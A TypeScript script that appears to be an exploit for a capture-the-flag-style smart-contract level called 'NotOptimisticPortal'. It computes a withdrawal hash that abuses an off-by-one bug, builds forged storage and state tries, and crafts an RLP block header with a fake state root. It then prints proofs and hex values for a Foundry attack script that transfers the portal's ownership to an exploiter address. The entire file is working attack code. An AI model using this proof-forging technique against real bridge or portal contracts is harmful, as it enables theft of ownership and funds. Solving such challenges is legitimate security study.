/**
 * NotOptimisticPortal - Merkle Proof Generator
 *
 * This script generates:
 * 1. Storage trie with withdrawalHash → 0x01
 * 2. State trie with L2_TARGET account
 * 3. RLP-encoded block header with our crafted state root
 * 4. All necessary proofs for the attack
 */

import { Trie } from "@ethereumjs/trie";
import { RLP } from "@ethereumjs/rlp";
import {
  keccak256,
  toBytes,
  hexToBytes,
  bytesToHex,
  encodeAbiParameters,
  parseAbiParameters,
  concat,
} from "viem";

// Constants from the contract
const L2_TARGET = "0x4242424242424242424242424242424242424242";

// Empty trie roots (keccak256 of RLP-encoded empty string)
const EMPTY_TRIE_ROOT =
  "0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421";
const EMPTY_OMMERS_HASH =
  "0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347";

interface AttackParams {
  player: `0x${string}`;
  portal: `0x${string}`;
  exploiter: `0x${string}`;
  amount: bigint;
  salt: bigint;
  latestBlockHash: `0x${string}`;
  latestBlockNumber: bigint;
  latestBlockTimestamp: bigint;
}

interface AttackData {
  withdrawalHash: `0x${string}`;
  stateRoot: `0x${string}`;
  rlpBlockHeader: `0x${string}`;
  stateTrieProof: `0x${string}`;
  storageTrieProof: `0x${string}`;
  accountStateRlp: `0x${string}`;
}

/**
 * Compute the withdrawal hash that will be verified
 * With 2 receivers, only element[0] is accumulated (off-by-one bug)
 *
 * Solidity uses abi.encode which is NOT packed encoding.
 * For keccak256(abi.encode(...)), we use encodeAbiParameters
 */
function computeWithdrawalHash(params: AttackParams): `0x${string}` {
  const targetSelector = "0x3a69197e" as `0x${string}`;

  // transferOwnership calldata for element[0]: selector + abi.encode(address)
  // This is: bytes4 selector + 32 bytes padded address
  const transferCalldata = concat([
    targetSelector,
    encodeAbiParameters(
      parseAbiParameters("address"),
      [params.exploiter]
    )
  ]);

  // Accumulated hash for receivers (only element[0] = portal)
  // keccak256(abi.encode(bytes32(0), portal))
  const receiversHash = keccak256(
    encodeAbiParameters(
      parseAbiParameters("bytes32, address"),
      [
        "0x0000000000000000000000000000000000000000000000000000000000000000",
        params.portal,
      ]
    )
  );

  // Accumulated hash for data (only element[0] = transferCalldata)
  // keccak256(abi.encode(bytes32(0), transferCalldata))
  const datasHash = keccak256(
    encodeAbiParameters(
      parseAbiParameters("bytes32, bytes"),
      [
        "0x0000000000000000000000000000000000000000000000000000000000000000",
        transferCalldata,
      ]
    )
  );

  // Final withdrawal hash
  // keccak256(abi.encode(tokenReceiver, amount, receiversHash, datasHash, salt))
  return keccak256(
    encodeAbiParameters(
      parseAbiParameters("address, uint256, bytes32, bytes32, uint256"),
      [params.player, params.amount, receiversHash, datasHash, params.salt]
    )
  );
}

/**
 * Create a storage trie with the withdrawal hash slot set to 0x01
 */
async function createStorageTrie(
  withdrawalHash: `0x${string}`
): Promise<{ trie: Trie; proof: Uint8Array[]; root: Uint8Array }> {
  const trie = new Trie();

  // Storage key is keccak256 of the slot (for SecureMerkleTrie)
  const storageKey = keccak256(withdrawalHash);

  // Value is RLP-encoded 0x01
  const value = RLP.encode(hexToBytes("0x01"));

  // Put the value in the trie
  await trie.put(hexToBytes(storageKey), value);

  // Generate proof
  const proof = await trie.createProof(hexToBytes(storageKey));

  return {
    trie,
    proof,
    root: trie.root(),
  };
}

/**
 * Create a state trie with L2_TARGET account containing our storage root
 */
async function createStateTrie(storageRoot: Uint8Array): Promise<{
  trie: Trie;
  proof: Uint8Array[];
  accountRlp: Uint8Array;
  root: Uint8Array;
}> {
  const trie = new Trie();

  // Account state: [nonce, balance, storageRoot, codeHash]
  const accountState = [
    hexToBytes("0x00"), // nonce = 0
    hexToBytes("0x00"), // balance = 0
    storageRoot, // our crafted storage root
    hexToBytes(keccak256("0x")), // codeHash (empty code)
  ];

  const accountRlp = RLP.encode(accountState);

  // Account key is keccak256 of address (for SecureMerkleTrie)
  const accountKey = keccak256(L2_TARGET as `0x${string}`);

  // Put account in state trie
  await trie.put(hexToBytes(accountKey), accountRlp);

  // Generate proof
  const proof = await trie.createProof(hexToBytes(accountKey));

  return {
    trie,
    proof,
    accountRlp,
    root: trie.root(),
  };
}

/**
 * Create RLP-encoded block header with our state root
 */
function createBlockHeader(
  params: AttackParams,
  stateRoot: Uint8Array
): Uint8Array {
  // Block header fields in order:
  // [parentHash, ommersHash, beneficiary, stateRoot, transactionsRoot,
  //  receiptsRoot, logsBloom, difficulty, number, gasLimit, gasUsed,
  //  timestamp, extraData, mixHash, nonce]

  const header = [
    hexToBytes(params.latestBlockHash), // parentHash
    hexToBytes(EMPTY_OMMERS_HASH), // ommersHash
    hexToBytes(
      "0x0000000000000000000000000000000000000000"
    ), // beneficiary
    stateRoot, // stateRoot (our crafted root!)
    hexToBytes(EMPTY_TRIE_ROOT), // transactionsRoot
    hexToBytes(EMPTY_TRIE_ROOT), // receiptsRoot
    new Uint8Array(256), // logsBloom (256 bytes of zeros)
    hexToBytes("0x"), // difficulty = 0
    toBytes(params.latestBlockNumber + 1n), // number (incremented)
    toBytes(30000000n), // gasLimit
    hexToBytes("0x"), // gasUsed = 0
    toBytes(params.latestBlockTimestamp + 1n), // timestamp (must be greater)
    hexToBytes("0x"), // extraData
    hexToBytes(
      "0x0000000000000000000000000000000000000000000000000000000000000000"
    ), // mixHash
    hexToBytes("0x0000000000000000"), // nonce
  ];

  return RLP.encode(header);
}

/**
 * Generate all attack data
 */
async function generateAttackData(
  params: AttackParams
): Promise<AttackData> {
  console.log("=== NotOptimisticPortal Attack Data Generator ===\n");

  // Step 1: Compute withdrawal hash
  console.log("Step 1: Computing withdrawal hash...");
  const withdrawalHash = computeWithdrawalHash(params);
  console.log(`  Withdrawal hash: ${withdrawalHash}\n`);

  // Step 2: Create storage trie
  console.log("Step 2: Creating storage trie...");
  const storage = await createStorageTrie(withdrawalHash);
  console.log(`  Storage root: ${bytesToHex(storage.root)}\n`);

  // Step 3: Create state trie
  console.log("Step 3: Creating state trie...");
  const state = await createStateTrie(storage.root);
  console.log(`  State root: ${bytesToHex(state.root)}\n`);

  // Step 4: Create block header
  console.log("Step 4: Creating block header...");
  const rlpBlockHeader = createBlockHeader(params, state.root);
  console.log(`  Block header length: ${rlpBlockHeader.length} bytes\n`);

  // Step 5: Encode proofs as RLP lists
  console.log("Step 5: Encoding proofs...");
  const stateTrieProof = RLP.encode(state.proof);
  const storageTrieProof = RLP.encode(storage.proof);

  const result: AttackData = {
    withdrawalHash: withdrawalHash,
    stateRoot: bytesToHex(state.root) as `0x${string}`,
    rlpBlockHeader: bytesToHex(rlpBlockHeader) as `0x${string}`,
    stateTrieProof: bytesToHex(stateTrieProof) as `0x${string}`,
    storageTrieProof: bytesToHex(storageTrieProof) as `0x${string}`,
    accountStateRlp: bytesToHex(state.accountRlp) as `0x${string}`,
  };

  console.log("\n=== Attack Data Generated ===\n");
  console.log(JSON.stringify(result, null, 2));

  return result;
}

// Main execution
async function main() {
  // Get parameters from environment or command line
  const args = process.argv.slice(2);

  if (args.length < 6) {
    console.log(`
Usage: npx ts-node generateProofs.ts <player> <portal> <exploiter> <latestBlockHash> <latestBlockNumber> <latestBlockTimestamp> [amount] [salt]

Example:
  npx ts-node generateProofs.ts \\
    0xf350B91b403ced3c6E68d34C13eBdaaE3bbd4E01 \\
    0xA0E9092e469B53eb28825189007556244482cEC4 \\
    0x1234...ExploiterAddress \\
    0xed20f024a9b5b75b1dd37fe6c96b829ed766d78103b3ab8f442f3b2ebbc557b9 \\
    60806040 \\
    1606824023 \\
    1000000000000000000 \\
    0
    `);
    process.exit(1);
  }

  const params: AttackParams = {
    player: args[0] as `0x${string}`,
    portal: args[1] as `0x${string}`,
    exploiter: args[2] as `0x${string}`,
    latestBlockHash: args[3] as `0x${string}`,
    latestBlockNumber: BigInt(args[4]),
    latestBlockTimestamp: BigInt(args[5]),
    amount: args[6] ? BigInt(args[6]) : 1000000000000000000n, // 1 token default
    salt: args[7] ? BigInt(args[7]) : 0n,
  };

  console.log("Parameters:");
  console.log(`  Player: ${params.player}`);
  console.log(`  Portal: ${params.portal}`);
  console.log(`  Exploiter: ${params.exploiter}`);
  console.log(`  Amount: ${params.amount}`);
  console.log(`  Salt: ${params.salt}`);
  console.log(`  Latest Block Hash: ${params.latestBlockHash}`);
  console.log(`  Latest Block Number: ${params.latestBlockNumber}`);
  console.log(`  Latest Block Timestamp: ${params.latestBlockTimestamp}`);
  console.log("");

  const attackData = await generateAttackData(params);

  // Output for Foundry script
  console.log("\n=== Foundry Script Parameters ===\n");
  console.log(`bytes memory rlpBlockHeader = hex"${attackData.rlpBlockHeader.slice(2)}";`);
  console.log(`bytes memory stateTrieProof = hex"${attackData.stateTrieProof.slice(2)}";`);
  console.log(`bytes memory storageTrieProof = hex"${attackData.storageTrieProof.slice(2)}";`);
  console.log(`bytes memory accountStateRlp = hex"${attackData.accountStateRlp.slice(2)}";`);
}

main().catch(console.error);
